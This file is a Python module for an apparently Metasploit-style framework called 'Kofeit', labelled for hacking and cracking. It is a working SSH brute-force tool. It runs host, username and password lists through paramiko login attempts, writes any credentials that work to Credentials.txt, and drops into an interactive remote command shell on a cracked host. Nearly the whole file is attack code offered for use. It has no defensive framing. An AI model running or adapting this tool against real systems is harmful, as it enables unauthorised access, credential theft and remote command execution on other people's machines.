#PLATFORM "[ANDROID,LINUX,Windows,Dos,Mac]" #KOFEIT#
#PACKAGE "SSH-1" #KOFEIT#
#TYPE "[Hacking,Pentest,Cracking]" #KOFEIT#
#VERSION "1.0" #KOFEIT#
#LANGUAGE "Python" #KOFEIT#
#AUTHOR "SINOCE" #KOFEIT#
#TYPE_RUN "REMOTE"  #KOFEIT#
#USY 1 #KOFEIT#
from Kofeit import *
import paramiko,socket

class KOFEIT():
    
    def __init__(self):
        self.module_info = {
            "module_type":{
            "Hacking":True,
            "Pentest":True,
            "Cracking":True,
            "SessionHijacking":False,
            "CSRF":False,
            "APT":False
            },

            "platform_target":
                """
    Android:Supported(Only Termux)
    Linux:Supported
    Windows":"Supported
    Dos:Supported
    Mac:Supported
                """,
            "module-language":"Python",
            "ctime":"1402/12/22 16:00",
            "version":"1.0"
        }
        self.module_name = "SSH-1 #KOFEIT#"
        self.options_types = {
            "HostList":"<class 'str'>",
            "UserList":"<class 'str'>",
            "PassList":"<class 'str'>",
            "Username":"<class 'str'>",
            "Password":"<class 'str'>",
            "HostName":"<class 'str'>",
            "PortSSH":"<class 'str'>"
        }
        self.options = {
            "HostList":"",
            "UserList":"",
            "PassList":"",
            "Username":"",
            "Password":"",
            "HostName":"",
            "PortSSH":2220
            }
        self.author_module = "Sinoce-HSC"
        self.description = "Only SSH Cracker Easy."
        self.wait = 15
    def info(self):
        language = self.module_info["module-language"]
        platform = self.module_info["platform_target"]
        ctime = self.module_info['ctime']
        version  = self.module_info['version']
        print_status("#6[#2*#6] #0" + f"Module-Name:{self.module_name}\nLanguage-Module:{language}\nPlatform-Supported:\n[\n{platform}\n]\nDescription:{self.description}\nAuthor:{self.author_module}\nTime-Created:{ctime}\nVersion:{version}", True)
    def check_variable(self,var):
        if var:return True
        else:return False
    def show_options(self):
        HostList:list=self.options['HostList']
        UserList:list=self.options['UserList']
        PassList:list=self.options['PassList']
        Username:str=self.options['Username']
        Password:str=self.options['Password']
        HostName:str=self.options['HostName']
        PortSSH:int=self.options['PortSSH']
        if not HostList:
            self.HostList="Null"
            self.HL  = False
        else:
            self.HL = True

        if not UserList:
            self.UserList="Null"
            self.UL  = False
        else:
            self.UL = True

        if not PassList:
            self.PassList="Null"
            self.PL  = False
        else:
            self.PL = True

        if not Username:
            self.Username="Null"
            self.UN  = False
        else:
            self.UN = True

        if not Password:
            self.Password="Null"
            self.PW  = False
        else:
            self.PW = True

        if not HostName:
            self.HostName="Null"
            self.HN  = False
        else:
            self.HN = True

        if not PortSSH:
            PortSSH=22
            self.PSSH = False
        else:
            self.PSSH = True
        print_status("-"*5 +f"LIST Options:" + "-"*5+"\n"+ f"""HostList : {self.options['HostList']} [{self.check_variable(self.options['HostList'])}]\nUserList : {self.options['UserList']} [{self.check_variable(self.options['UserList'])}]\nPassList : {self.options['PassList']} [{self.check_variable(self.options['PassList'])}]\n""" +"-"*5 +"String Options:" + "-"*5+"\n"+ f"""HostName : {self.options['HostName']} [{self.check_variable(self.options['HostName'])}]\nUsername : {self.options['Username']} [{self.check_variable(self.options['Username'])}]\nPassword:{self.options['Password']} [{self.check_variable(self.options['Password'])}]\nPortSSH:{self.options['PortSSH']} [{self.check_variable(self.options['PortSSH'])}]\n""", True)
    def shell(self, client,user,addr):
        ShellSSH = True
        print_star("#1Connected #66SSH #1{}#5@#6{}#0".format(user,addr), True)
        while ShellSSH:
            print_status(f"#22<#4(#11{user}#5@#66{addr}#4)#5:#22>#1 ",False)
            ssh_command = input()
            if ssh_command:
                exec_command = client.exec_command(ssh_command)[1].read().decode("UTF-8")
                print_star(f"#66{exec_command}",True)
            else:
                print()
    def set_value(self,key,value):
        if key in self.options:
            if self.options_types[key] == "<class 'list'>"  and str(type(value)) == "<class 'str'>":
                value = value.split(",")
                self.options[key] = value
                value_str = '[ ' + " | ".join(value) + ' ]'
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value_str}#0",True)
            elif self.options_types[key] == "<class 'str'>" and str(type(value)) == "<class 'str'>":
                self.options[key] = value
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value}#0",True)
            # if str(type(value)) == self.options_types[key]:
            #     self.options[key] = value
            #     print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value}#0",True)
            else:
                print_no(f"#4Type#2 {key}#3 Is #1{self.options_types[key]} #2can't #22set #5 > #22{str(type(value))}#0",True)
        else:
            print_no(f"#1{key}#22 Invalid #4Not#3 Found #2!#0",True)
    def help(self):
        print_status(f"""
#2info #3ARGS#5[#22None#5] #6(#55Show info Module #11{self.module_name.split(" ")[0]}#6)
#2set #3/ #2set_value #3ARGS#5[#2<#1KEY#2> #2<#1VALUE#2>#5] #6(#55Set A Key To Value#6)
#2show options #3/ #2show_options #3ARGS#5[#22None#5] #6(#55Show the options Module #11{self.module_name.split(" ")[0]}#6)
#2check #3ARGS#5[#22None#5] #6(#55Check Options Seted and Module #11{self.module_name.split(" ")[0]}#6)
#2exploit #3/ #2run #3ARGS#5[#22None#5] #6(#55run the module #11{self.module_name.split(" ")[0]}#6)""",True)
    def check(self):
        if self.check_variable(self.options['HostList']):
            print_ok("HostList Not Empty .",True)
            if os.path.isfile(self.options['HostList']):
                print_ok("HostList File Exist .",True)
                HostList = open(self.options['HostList']).read().splitlines()
                if len(HostList) > 0 and HostList:
                    print_ok("HostList Verifyed .",True)
                    print_ok("HostList Correct .",True)
                else:
                    print_status("#6[#2*#6] #0" + "HostList Verifyed !", True)
                    print_no("HostList InCorrect !",True)
            else:
                print_no("HostList File Not Exist !",True)
        else:
            print_status("#6[#2*#6] #0" + "HostList Is Empty !", True)

        if self.check_variable(self.options['UserList']):
            print_ok("UserList Not Empty .",True)
            if os.path.isfile(self.options['UserList']):
                print_ok("UserList File Exist .",True)
                UserList = open(self.options['UserList']).read().splitlines()
                if len(UserList) > 0 and UserList:
                    print_ok("UserList Verifyed .",True)
                    print_ok("UserList Correct .",True)
                else:
                    print_status("#6[#2*#6] #0" + "UserList Verifyed !", True)
                    print_no("UserList InCorrect !",True)
            else:
                print_no("UserList File Not Exist",True)
        else:
            print_status("#6[#2*#6] #0" + "UserList Is Empty", True)

        if self.check_variable(self.options['PassList']) :
            print_ok("PassList Not Empty .",True)
            if os.path.isfile(self.options['PassList']):
                print_ok("PassList File Exist .",True)
                PassList = open(self.options['PassList']).read().splitlines()
                if len(PassList) > 0 and PassList:
                    print_ok("PassList Verifyed .",True)
                    print_ok("PassList Correct .",True)
                else:
                    print_status("#6[#2*#6] #0" + "PassList Verifyed !", True)
                    print_no("PassList InCorrect !",True)
            else:
                print_no("PassList File Not Exist",True)
        else:
            print_status("#6[#2*#6] #0" + "PassList Is Empty", True)

        if self.check_variable(self.options['Username']) :
            print_ok("Username Not Empty .",True)
            if len(self.options['Username']) > 0 and self.options['Username']:
                print_ok("Username Verifyed .",True)
                print_ok("Username Correct .",True)
            else:
                print_status("#6[#2*#6] #0" + "Username Verifyed !", True)
                print_no("PassList InCorrect !")
        else:
            print_status("#6[#2*#6] #0" + "Username Is Empty !", True)
            print_status("#6[#2*#6] #0" + "Username Is default='root'", True)

        if self.check_variable(self.options['Password']) :
            print_ok("Password Not Empty .",True)
            if len(self.options['Password']) > 0 and self.options['Password']:
                print_ok("Password Verifyed .",True)
                print_ok("Password Correct .",True)
            else:
                print_status("#6[#2*#6] #0" + "Password Verifyed !", True)
                print_no("Password InCorrect !",True)
        else:
            print_status("#6[#2*#6] #0" + "Password Is Empty !", True)
            print_status("#6[#2*#6] #0" + "Password Is default='123456Seven'", True)

        if self.check_variable(self.options['HostName']) :
            print_ok("HostName Not Empty .",True)
            if len(self.options['HostName']) > 0 and self.options['HostName']:
                print_ok("HostName Verifyed .",True)
                print_ok("HostName Correct .",True)
            else:
                print_status("#6[#2*#6] #0" + "HostName Verifyed !", True)
                print_no("HostName InCorrect !")
        else:
            print_status("#6[#2*#6] #0" + "HostName Is Empty !", True)
            print_status("#6[#2*#6] #0" + "PortSSH Is default=22", True)

        if self.check_variable(self.options['PortSSH']) :
            print_ok("PortSSH Not Empty .",True)
            if self.options['PortSSH']:
                print_ok("PortSSH Verifyed .",True)
                print_ok("PortSSH Correct .",True)
            else:
                print_status("#6[#2*#6] #0" + "PortSSH Verifyed !", True)
                print_no("PortSSH InCorrect !",True)
        else:
            print_status("#6[#2*#6] #0" + "PortSSH Is Empty !", True)
            print_status("#6[#2*#6] #0" + "PortSSH Is default=22", True)

    def create_client(self):
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        return cli

    def exploit(self):
        client = self.create_client()
        Host_cracked = []
        path_credentials = os.path.join(os.getcwd(), "Credentials.txt")
        open(path_credentials,'w').write("")
        num_test = 0
        if self.check_variable(self.options['HostList']):
            HostList = open(self.options['HostList']).read().splitlines()
            if self.check_variable(self.options['UserList']):
                UserList = open(self.options['UserList']).read().splitlines()
                if self.check_variable(self.options['PassList']):
                    PassList = open(self.options['PassList']).read().splitlines()
                    for Host in HostList:
                        if Host not in Host_cracked and Host not in open(path_credentials,'rb').read().decode():
                            for User in UserList:
                                for Pass in PassList:
                                     #host port user pass
                                    if num_test >= 3:
                                        client = self.create_client()
                                        num_test = 0
                                    try:
                                        client.connect(Host, self.options['PortSSH'], User, Pass,timeout=3)
                                    except socket.timeout:
                                        print_no(f"#33 Host#5:#3{Host} #5is#22 unreachable, #66TimeOut#0",True)
                                    
                                    except paramiko.AuthenticationException:
                                        print_no(f"#2Invalid #3Credentials #1{Host}#5:#3(#1{User}#5/#66{Pass}#3)#0",True)
                                    
                                    except paramiko.ssh_exception.SSHException:
                                        print_status("#6[#2*#6] #0" + f"Wait For Second {self.wait} ...", True)
                                    
                                    else:
                                        open(path_credentials,"a").write("="*30 + f"Host:{Host}\nUSER:{User}\nPASS:{Pass}\n" + "="*30)
                                        print_ok(f"Host:{Host} Cracked \nCredentials Saved on 'Credentials.txt'",True)
                                        Host_cracked.append(Host)
                                        break
                                break

                else:
                    Password = self.options['Password']
            else:
                Username = self.UN
        else:
            Host = self.options['HostName']
            if Host not in Host_cracked and Host not in open(path_credentials,'rb').read().decode():
                if self.check_variable(self.options['UserList']):
                    UserList = open(self.options['UserList']).read().splitlines()
                    if self.check_variable(self.options['PassList']):
                        PassList = open(self.options['PassList']).read().splitlines()
                        for User in UserList:
                            for Pass in PassList:
                                if num_test >= 3:
                                    client = self.create_client()
                                    num_test = 0
                                try:
                                    client.connect(Host, self.options['PortSSH'], User, Pass,timeout=3)
                                except socket.timeout:
                                    print_no(f"#33 Host#5:#3{Host} #5is#22 unreachable, #66TimeOut#0",True)
                                
                                except paramiko.AuthenticationException:
                                    print_no(f"#2Invalid #3Credentials #1{Host}#5:#3(#1{User}#5/#66{Pass}#3)#0",True)
                                    num_test +=1
                                
                                except paramiko.ssh_exception.SSHException:
                                    print_status("#6[#2*#6] #0" + f"Wait For Second {self.wait} ...", True)
                                
                                else:
                                    open(path_credentials,"a").write("="*30 + f"Host:{Host}\nUSER:{User}\nPASS:{Pass}\n" + "="*30)
                                    print_ok(f"Host:{Host} Cracked \nCredentials Saved on 'Credentials.txt'",True)
                                    Host_cracked.append(Host)
                                    exit()
                                # open(path_credentials,"a").write("="*30 + f"Host:{Host}\nUSER:{User}\nPASS:{Pass}\n" + "="*30)
                else:
                    Username = self.options['Username']
                    if self.check_variable(self.options['PassList']):
                        PassList = open(self.options['PassList']).read().splitlines()
                        for Pass in PassList:
                            if num_test >= 3:
                                client = self.create_client()
                                num_test = 0
                            try:
                                client.connect(Host, self.options['PortSSH'], Username, Pass,timeout=3)
                            except socket.timeout:
                                print_no(f"#33 Host#5:#3{Host} #5is#22 unreachable, #66TimeOut#0")
                            
                            except paramiko.AuthenticationException:
                                print_no(f"#2Invalid #3Credentials #1{Host}#5:#3(#1{Username}#5/#66{Pass}#3)#0",True)
                                num_test +=1
                            
                            except paramiko.ssh_exception.SSHException:
                                print_status("#6[#2*#6] #0" + f"Wait For Second {self.wait} ...", True)
                            
                            else:
                                module_name = self.module_name.split(" "[0])
                                open(path_credentials,"ab+").write("=".encode()*30 + f"\n{module_name[0]}\nHost:{Host}\nUSER:{Username}\nPASS:{Pass}\n".encode() + "=".encode()*30)
                                print_ok(f"Host:{Host} Cracked \nCredentials Saved on 'Credentials.txt'",True)
                                Host_cracked.append(Host)
                                self.shell(client, Username, Host)
                                exit()
                    else:
                        print_no("PassList Is Required .",True)
            else:
                print_status("#6[#2*#6] #0" + F"Host:{Host} Before Cracked Credentials Saved on '{path_credentials}'", True)